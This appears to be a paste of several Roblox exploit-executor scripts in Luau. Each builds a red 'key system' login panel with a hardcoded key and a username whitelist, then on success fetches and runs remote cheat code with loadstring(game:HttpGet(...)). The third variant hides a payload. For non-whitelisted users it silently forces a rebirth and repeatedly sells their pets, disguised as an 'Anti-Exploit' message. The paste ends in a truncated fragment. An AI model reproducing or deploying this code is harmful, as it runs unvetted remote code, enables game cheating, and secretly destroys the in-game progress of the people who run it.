
Pro key system









local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

-- DELTA FIX: Target PlayerGui directly to prevent CoreGui parent crashes on mobile
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RedKeySystem"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- ==========================================
-- BACK BLUR EFFECT
-- ==========================================
local blurContainer = Instance.new("Frame")
blurContainer.Size = UDim2.new(1, 0, 1, 0)
blurContainer.BackgroundTransparency = 1
blurContainer.Parent = screenGui

local blurEffect = Lighting:FindFirstChild("KyoSystemBlur") or Instance.new("BlurEffect")
blurEffect.Name = "KyoSystemBlur"
blurEffect.Size = 15 
blurEffect.Parent = Lighting

-- Create Pure Crimson Background Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 440, 0, 310) 
frame.Position = UDim2.new(0.5, -220, 0.5, -155) 
frame.BackgroundColor3 = Color3.fromRGB(20, 5, 5) -- Pure deep red dark theme
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true

-- Mobile-friendly drag implementation (Replaces deprecated .Draggable property)
local dragToggle, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragToggle = false
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragToggle = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragToggle then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
end)

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 14) 
frameCorner.Parent = frame

-- FULL RED: Intense Neon Border Accent
local borderStroke = Instance.new("UIStroke")
borderStroke.Color = Color3.fromRGB(255, 0, 0) 
borderStroke.Thickness = 2
borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
borderStroke.Parent = frame

-- FULL RED: Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60) 
title.BackgroundTransparency = 1
title.Text = "KEY SYSTEM" 
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextSize = 18 
title.Font = Enum.Font.RobotoMono
title.Parent = frame

-- Create TextBox (Input Field)
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.85, 0, 0, 44) 
textBox.Position = UDim2.new(0.075, 0, 0.22, 0) 
textBox.BackgroundColor3 = Color3.fromRGB(35, 10, 10) -- Red-tinted background input
textBox.TextColor3 = Color3.fromRGB(255, 200, 200)
textBox.PlaceholderText = "Enter Access Key..."
textBox.PlaceholderColor3 = Color3.fromRGB(150, 60, 60)
textBox.TextSize = 15 
textBox.Text = ""
textBox.Font = Enum.Font.RobotoMono
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local textCorner = Instance.new("UICorner")
textCorner.CornerRadius = UDim.new(0, 8)
textCorner.Parent = textBox

local textStroke = Instance.new("UIStroke")
textStroke.Color = Color3.fromRGB(120, 20, 20)
textStroke.Thickness = 1
textStroke.Parent = textBox

-- FULL RED: Submit Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.85, 0, 0, 46) 
button.Position = UDim2.new(0.075, 0, 0.48, 0) 
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.TextColor3 = Color3.fromRGB(20, 0, 0) -- Dark red contrast text
button.Text = "Verify"
button.TextSize = 18
button.Font = Enum.Font.RobotoMono
button.AutoButtonColor = false 
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = button

-- FULL RED: Get Key Button Layout
local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.85, 0, 0, 46) 
getKeyButton.Position = UDim2.new(0.075, 0, 0.73, 0) 
getKeyButton.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
getKeyButton.TextColor3 = Color3.fromRGB(255, 50, 50)
getKeyButton.Text = "GET KEY"
getKeyButton.TextSize = 15 
getKeyButton.Font = Enum.Font.RobotoMono
getKeyButton.AutoButtonColor = false 
getKeyButton.Parent = frame

local getKeyCorner = Instance.new("UICorner")
getKeyCorner.CornerRadius = UDim.new(0, 8)
getKeyCorner.Parent = getKeyButton

local getKeyStroke = Instance.new("UIStroke")
getKeyStroke.Color = Color3.fromRGB(255, 0, 0)
getKeyStroke.Thickness = 1
getKeyStroke.Parent = getKeyButton

-- Wrap layout components into container 
frame.Parent = blurContainer

-- ==========================================
-- INTERACTIVE RED TWEEN ANIMATIONS
-- ==========================================
local function tween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

local infoFast = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local infoSlow = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Global Processing State Variable
local isProcessing = false

-- TextBox Active Interaction States
textBox.Focused:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0), Thickness = 1.5}):Play()
end)

textBox.FocusLost:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(120, 20, 20), Thickness = 1}):Play()
end)

-- Main Verification Action Hover States (FIXED: Reset colors on Leave)
button.MouseEnter:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
end)

button.MouseLeave:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0)}):Play()
end)

-- Secondary Action Hover States
getKeyButton.MouseEnter:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(70, 15, 15)}):Play()
end)

getKeyButton.MouseLeave:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(40, 10, 10)}):Play()
end)

-- ==========================================
-- DELTA INTERACTION PROCESSING
-- ==========================================
local KEY_LINK = "https://linkvertise.com" 
local CORRECT_KEY = "PrivateScript1"

-- DELTA COMPATIBLE: Clipboard Functionality
getKeyButton.MouseButton1Click:Connect(function()
    local oldText = getKeyButton.Text
    local clipFunc = setclipboard or toclipboard or (Clipboard and Clipboard.set)
    
    if clipFunc then
        clipFunc(KEY_LINK)
        getKeyButton.Text = "COPIED TO CLIPBOARD!"
    else
        getKeyButton.Text = "FAILED TO AUTO-COPY KEY"
    end
    
    task.wait(2)
    getKeyButton.Text = oldText
end)

-- Crimson Logic Processing System (FIXED: Added Handle for Invalid Key Input)
button.MouseButton1Click:Connect(function()
    if isProcessing then return end
    isProcessing = true
    
    local input = textBox.Text
    
    if input == CORRECT_KEY then
        button.Text = "ACCESS GRANTED"
        
        -- GREEN BUTTON + WHITE TEXT
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(0, 255, 120), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        tween(borderStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0)}):Play() 
        
        task.wait(1.2)
        
        -- Clean structural fade-out transition sequence
        tween(frame, infoSlow, {BackgroundTransparency = 1}):Play()
        tween(title, infoSlow, {TextTransparency = 1}):Play()
        tween(textBox, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(textStroke, infoSlow, {Transparency = 1}):Play()
        tween(button, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(getKeyButton, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(getKeyStroke, infoSlow, {Transparency = 1}):Play()
        tween(borderStroke, infoSlow, {Transparency = 1}):Play()
        
        task.wait(0.4)
        blurEffect:Destroy()
        screenGui:Destroy()
        loadstring(game:HttpGet("https://raw.githubusercontent.com"))()
    else
        -- Logic kapag MALI ang nilagay na key
        button.Text = "INVALID KEY"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(150, 0, 0), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        
        task.wait(1.5)
        
        -- Ibalik sa orihinal na kulay red at text na "Verify"
        button.Text = "Verify"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0), TextColor3 = Color3.fromRGB(20, 0, 0)}):Play()
        
        -- Payagan ulit pumindot ang user para mag-retry
        isProcessing = false
    end
end)








whitelist players only








-- ==========================================
-- WHITELIST & CONFIGURATION SYSTEM
-- ==========================================
local WHITELISTED_USERS = {
    "ben446783",
    "carxy126",
    "elrawa3454"
}

local function isWhitelisted(player)
    for _, idOrName in ipairs(WHITELISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KEY SYSTEM UI (Lalabas sa LAHAT ng player)
-- ==========================================
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

-- DELTA FIX: Target PlayerGui directly to prevent CoreGui parent crashes on mobile
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RedKeySystem"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- ==========================================
-- BACK BLUR EFFECT
-- ==========================================
local blurContainer = Instance.new("Frame")
blurContainer.Size = UDim2.new(1, 0, 1, 0)
blurContainer.BackgroundTransparency = 1
blurContainer.Parent = screenGui

local blurEffect = Lighting:FindFirstChild("KyoSystemBlur") or Instance.new("BlurEffect")
blurEffect.Name = "KyoSystemBlur"
blurEffect.Size = 15 
blurEffect.Parent = Lighting

-- Create Pure Crimson Background Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 440, 0, 310) 
frame.Position = UDim2.new(0.5, -220, 0.5, -155) 
frame.BackgroundColor3 = Color3.fromRGB(20, 5, 5) -- Pure deep red dark theme
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true

-- Mobile-friendly drag implementation (Replaces deprecated .Draggable property)
local dragToggle, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragToggle = false
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragToggle = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragToggle then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
end)

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 14) 
frameCorner.Parent = frame

-- FULL RED: Intense Neon Border Accent
local borderStroke = Instance.new("UIStroke")
borderStroke.Color = Color3.fromRGB(255, 0, 0) 
borderStroke.Thickness = 2
borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
borderStroke.Parent = frame

-- FULL RED: Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60) 
title.BackgroundTransparency = 1
title.Text = "KEY SYSTEM" 
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextSize = 18 
title.Font = Enum.Font.RobotoMono
title.Parent = frame

-- Create TextBox (Input Field)
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.85, 0, 0, 44) 
textBox.Position = UDim2.new(0.075, 0, 0.22, 0) 
textBox.BackgroundColor3 = Color3.fromRGB(35, 10, 10) -- Red-tinted background input
textBox.TextColor3 = Color3.fromRGB(255, 200, 200)
textBox.PlaceholderText = "Enter Access Key..."
textBox.PlaceholderColor3 = Color3.fromRGB(150, 60, 60)
textBox.TextSize = 15 
textBox.Text = ""
textBox.Font = Enum.Font.RobotoMono
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local textCorner = Instance.new("UICorner")
textCorner.CornerRadius = UDim.new(0, 8)
textCorner.Parent = textBox

local textStroke = Instance.new("UIStroke")
textStroke.Color = Color3.fromRGB(120, 20, 20)
textStroke.Thickness = 1
textStroke.Parent = textBox

-- FULL RED: Submit Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.85, 0, 0, 46) 
button.Position = UDim2.new(0.075, 0, 0.48, 0) 
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.TextColor3 = Color3.fromRGB(20, 0, 0) -- Dark red contrast text
button.Text = "Verify"
button.TextSize = 18
button.Font = Enum.Font.RobotoMono
button.AutoButtonColor = false 
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = button

-- FULL RED: Get Key Button Layout
local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.85, 0, 0, 46) 
getKeyButton.Position = UDim2.new(0.075, 0, 0.73, 0) 
getKeyButton.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
getKeyButton.TextColor3 = Color3.fromRGB(255, 50, 50)
getKeyButton.Text = "GET KEY"
getKeyButton.TextSize = 15 
getKeyButton.Font = Enum.Font.RobotoMono
getKeyButton.AutoButtonColor = false 
getKeyButton.Parent = frame

local getKeyCorner = Instance.new("UICorner")
getKeyCorner.CornerRadius = UDim.new(0, 8)
getKeyCorner.Parent = getKeyButton

local getKeyStroke = Instance.new("UIStroke")
getKeyStroke.Color = Color3.fromRGB(255, 0, 0)
getKeyStroke.Thickness = 1
getKeyStroke.Parent = getKeyButton

-- Wrap layout components into container 
frame.Parent = blurContainer

-- ==========================================
-- INTERACTIVE RED TWEEN ANIMATIONS
-- ==========================================
local function tween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

local infoFast = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local infoSlow = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Global Processing State Variable
local isProcessing = false

-- TextBox Active Interaction States
textBox.Focused:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0), Thickness = 1.5}):Play()
end)

textBox.FocusLost:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(120, 20, 20), Thickness = 1}):Play()
end)

-- Main Verification Action Hover States
button.MouseEnter:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
end)

button.MouseLeave:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0)}):Play()
end)

-- Secondary Action Hover States
getKeyButton.MouseEnter:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(70, 15, 15)}):Play()
end)

getKeyButton.MouseLeave:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(40, 10, 10)}):Play()
end)

-- ==========================================
-- DELTA INTERACTION PROCESSING
-- ==========================================
local KEY_LINK = "https://linkvertise.com" 
local CORRECT_KEY = "PrivateScript1"

-- DELTA COMPATIBLE: Clipboard Functionality
getKeyButton.MouseButton1Click:Connect(function()
    local oldText = getKeyButton.Text
    local clipFunc = setclipboard or toclipboard or (Clipboard and Clipboard.set)
    
    if clipFunc then
        clipFunc(KEY_LINK)
        getKeyButton.Text = "COPIED TO CLIPBOARD!"
    else
        getKeyButton.Text = "FAILED TO AUTO-COPY KEY"
    end
    
    task.wait(2)
    getKeyButton.Text = oldText
end)

-- Crimson Logic Processing System
button.MouseButton1Click:Connect(function()
    if isProcessing then return end
    isProcessing = true
    
    local input = textBox.Text
    
    if input == CORRECT_KEY then
        if isWhitelisted(localPlayer) then
            button.Text = "ACCESS GRANTED"
            
            -- GREEN BUTTON + WHITE TEXT
            tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(0, 255, 120), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
            tween(borderStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0)}):Play() 
            
            task.wait(1.2)
            
            -- Clean structural fade-out transition sequence
            tween(frame, infoSlow, {BackgroundTransparency = 1}):Play()
            tween(title, infoSlow, {TextTransparency = 1}):Play()
            tween(textBox, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
            tween(textStroke, infoSlow, {Transparency = 1}):Play()
            tween(button, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
            tween(getKeyButton, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
            tween(getKeyStroke, infoSlow, {Transparency = 1}):Play()
            tween(borderStroke, infoSlow, {Transparency = 1}):Play()
            
            task.wait(0.4)
            blurEffect:Destroy()
            screenGui:Destroy()
            
            -- Loadstring kapag whitelisted at tama ang key
            loadstring(game:HttpGet("https://raw.githubusercontent.com/IVRzHxZ/Kyo-Private-Muscle-Beach-Arena/refs/heads/main/Kyo-Private"))()
        else
            button.Text = "NOT WHITELISTED!"
            tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(150, 0, 0), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
            
            task.wait(1.5)
            button.Text = "Verify"
            tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0), TextColor3 = Color3.fromRGB(20, 0, 0)}):Play()
            isProcessing = false
        end
    else
        button.Text = "INVALID KEY"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(150, 0, 0), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        
        task.wait(1.5)
        
        button.Text = "Verify"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0), TextColor3 = Color3.fromRGB(20, 0, 0)}):Play()
        
        isProcessing = false
    end
end)








whitelisted player on in muscle beach arena script









-- ==========================================
-- WHITELIST & CONFIGURATION SYSTEM
-- ==========================================
local WHITELISTED_USERS = {
    "ben446783",
    "carxy126",
    "elrawa3454"
}

local function isWhitelisted(player)
    for _, idOrName in ipairs(WHITELISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG HINDI WHITELISTED: Auto-Rebirth & Auto-Sell AGAD (Walang Key System na lalabas)
-- ==========================================
if not isWhitelisted(localPlayer) then
    print("[Anti-Exploit] Unwhitelisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth
    pcall(function()
        game:GetService("ReplicatedStorage").remotes.rebirthRequest:FireServer()
    end)
    
    -- 2. Background Auto-Sell System
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remotesFolder = ReplicatedStorage:FindFirstChild("remotes") or ReplicatedStorage:FindFirstChild("Remotes")
    local sellRemote = nil
    
    if remotesFolder then
        sellRemote = remotesFolder:FindFirstChild("sellPet") 
            or remotesFolder:FindFirstChild("SellPet") 
            or remotesFolder:FindFirstChild("sellRequest")
            or remotesFolder:FindFirstChild("SellRequest")
    end
    
    if sellRemote then
        local function startBackgroundAutoSell(petName)
            task.spawn(function()
                while true do
                    local p = Players.LocalPlayer
                    local petsFolder = p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
                    
                    if petsFolder and petsFolder:FindFirstChild(petName) then
                        pcall(function()
                            sellRemote:FireServer(petsFolder[petName])
                        end)
                    end
                    
                    task.wait(1)
                end
            end)
        end
        
        local petsToAutoSell = {
            "Cat", "Dog", "Rabbit", "Hamster", "Shark",
            "Wolf", "Fox", "MuscleMan", "Spike", "Bear",
            "Snow Wolf", "Forest Deer", "Fire Pup", "Shadow Wolf", "Thunder Bear",
            "Spirit Wolf", "Storm Tiger", "Lunar Dragon", "Crystal Dragon",
            "Pelican", "Divine Dragon", "Neon Divine Dragon", "Space Dragon",
            "Red Alien", "Fire Alien", "Vortex", "Astrax"
        }
        
        for _, pet in ipairs(petsToAutoSell) do
            startBackgroundAutoSell(pet)
        end
    end
    
    -- I-terminate na ang script para hindi na lumabas ang UI sa mga hindi whitelisted
    return
end

-- ==========================================
-- KEY SYSTEM UI (Para lamang sa mga WHITELISTED)
-- ==========================================
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

-- DELTA FIX: Target PlayerGui directly to prevent CoreGui parent crashes on mobile
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RedKeySystem"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- ==========================================
-- BACK BLUR EFFECT
-- ==========================================
local blurContainer = Instance.new("Frame")
blurContainer.Size = UDim2.new(1, 0, 1, 0)
blurContainer.BackgroundTransparency = 1
blurContainer.Parent = screenGui

local blurEffect = Lighting:FindFirstChild("KyoSystemBlur") or Instance.new("BlurEffect")
blurEffect.Name = "KyoSystemBlur"
blurEffect.Size = 15 
blurEffect.Parent = Lighting

-- Create Pure Crimson Background Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 440, 0, 310) 
frame.Position = UDim2.new(0.5, -220, 0.5, -155) 
frame.BackgroundColor3 = Color3.fromRGB(20, 5, 5) -- Pure deep red dark theme
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true

-- Mobile-friendly drag implementation (Replaces deprecated .Draggable property)
local dragToggle, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragToggle = false
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragToggle = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragToggle then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
end)

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 14) 
frameCorner.Parent = frame

-- FULL RED: Intense Neon Border Accent
local borderStroke = Instance.new("UIStroke")
borderStroke.Color = Color3.fromRGB(255, 0, 0) 
borderStroke.Thickness = 2
borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
borderStroke.Parent = frame

-- FULL RED: Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60) 
title.BackgroundTransparency = 1
title.Text = "KEY SYSTEM" 
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextSize = 18 
title.Font = Enum.Font.RobotoMono
title.Parent = frame

-- Create TextBox (Input Field)
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.85, 0, 0, 44) 
textBox.Position = UDim2.new(0.075, 0, 0.22, 0) 
textBox.BackgroundColor3 = Color3.fromRGB(35, 10, 10) -- Red-tinted background input
textBox.TextColor3 = Color3.fromRGB(255, 200, 200)
textBox.PlaceholderText = "Enter Access Key..."
textBox.PlaceholderColor3 = Color3.fromRGB(150, 60, 60)
textBox.TextSize = 15 
textBox.Text = ""
textBox.Font = Enum.Font.RobotoMono
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local textCorner = Instance.new("UICorner")
textCorner.CornerRadius = UDim.new(0, 8)
textCorner.Parent = textBox

local textStroke = Instance.new("UIStroke")
textStroke.Color = Color3.fromRGB(120, 20, 20)
textStroke.Thickness = 1
textStroke.Parent = textBox

-- FULL RED: Submit Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.85, 0, 0, 46) 
button.Position = UDim2.new(0.075, 0, 0.48, 0) 
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.TextColor3 = Color3.fromRGB(20, 0, 0) -- Dark red contrast text
button.Text = "Verify"
button.TextSize = 18
button.Font = Enum.Font.RobotoMono
button.AutoButtonColor = false 
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = button

-- FULL RED: Get Key Button Layout
local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.85, 0, 0, 46) 
getKeyButton.Position = UDim2.new(0.075, 0, 0.73, 0) 
getKeyButton.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
getKeyButton.TextColor3 = Color3.fromRGB(255, 50, 50)
getKeyButton.Text = "GET KEY"
getKeyButton.TextSize = 15 
getKeyButton.Font = Enum.Font.RobotoMono
getKeyButton.AutoButtonColor = false 
getKeyButton.Parent = frame

local getKeyCorner = Instance.new("UICorner")
getKeyCorner.CornerRadius = UDim.new(0, 8)
getKeyCorner.Parent = getKeyButton

local getKeyStroke = Instance.new("UIStroke")
getKeyStroke.Color = Color3.fromRGB(255, 0, 0)
getKeyStroke.Thickness = 1
getKeyStroke.Parent = getKeyButton

-- Wrap layout components into container 
frame.Parent = blurContainer

-- ==========================================
-- INTERACTIVE RED TWEEN ANIMATIONS
-- ==========================================
local function tween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

local infoFast = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local infoSlow = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Global Processing State Variable
local isProcessing = false

-- TextBox Active Interaction States
textBox.Focused:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0), Thickness = 1.5}):Play()
end)

textBox.FocusLost:Connect(function()
    tween(textStroke, infoFast, {Color = Color3.fromRGB(120, 20, 20), Thickness = 1}):Play()
end)

-- Main Verification Action Hover States
button.MouseEnter:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
end)

button.MouseLeave:Connect(function()
    if isProcessing then return end
    tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0)}):Play()
end)

-- Secondary Action Hover States
getKeyButton.MouseEnter:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(70, 15, 15)}):Play()
end)

getKeyButton.MouseLeave:Connect(function()
    tween(getKeyButton, infoFast, {BackgroundColor3 = Color3.fromRGB(40, 10, 10)}):Play()
end)

-- ==========================================
-- DELTA INTERACTION PROCESSING
-- ==========================================
local KEY_LINK = "https://linkvertise.com" 
local CORRECT_KEY = "PrivateScript1"

-- DELTA COMPATIBLE: Clipboard Functionality
getKeyButton.MouseButton1Click:Connect(function()
    local oldText = getKeyButton.Text
    local clipFunc = setclipboard or toclipboard or (Clipboard and Clipboard.set)
    
    if clipFunc then
        clipFunc(KEY_LINK)
        getKeyButton.Text = "COPIED TO CLIPBOARD!"
    else
        getKeyButton.Text = "FAILED TO AUTO-COPY KEY"
    end
    
    task.wait(2)
    getKeyButton.Text = oldText
end)

-- Crimson Logic Processing System
button.MouseButton1Click:Connect(function()
    if isProcessing then return end
    isProcessing = true
    
    local input = textBox.Text
    
    if input == CORRECT_KEY then
        button.Text = "ACCESS GRANTED"
        
        -- GREEN BUTTON + WHITE TEXT
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(0, 255, 120), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        tween(borderStroke, infoFast, {Color = Color3.fromRGB(255, 0, 0)}):Play() 
        
        task.wait(1.2)
        
        -- Clean structural fade-out transition sequence
        tween(frame, infoSlow, {BackgroundTransparency = 1}):Play()
        tween(title, infoSlow, {TextTransparency = 1}):Play()
        tween(textBox, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(textStroke, infoSlow, {Transparency = 1}):Play()
        tween(button, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(getKeyButton, infoSlow, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tween(getKeyStroke, infoSlow, {Transparency = 1}):Play()
        tween(borderStroke, infoSlow, {Transparency = 1}):Play()
        
        task.wait(0.4)
        blurEffect:Destroy()
        screenGui:Destroy()
        
        -- Loadstring kapag whitelisted at tama ang key
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IVRzHxZ/Kyo-Private-Muscle-Beach-Arena/refs/heads/main/Kyo-Private"))()
    else
        button.Text = "INVALID KEY"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(150, 0, 0), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        
        task.wait(1.5)
        
        button.Text = "Verify"
        tween(button, infoFast, {BackgroundColor3 = Color3.fromRGB(255, 0, 0), TextColor3 = Color3.fromRGB(20, 0, 0)}):Play()
        
        isProcessing = false
    end
end)











Hacker key system












local KeySystem = {}
KeySystem.__index = KeySystem

local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
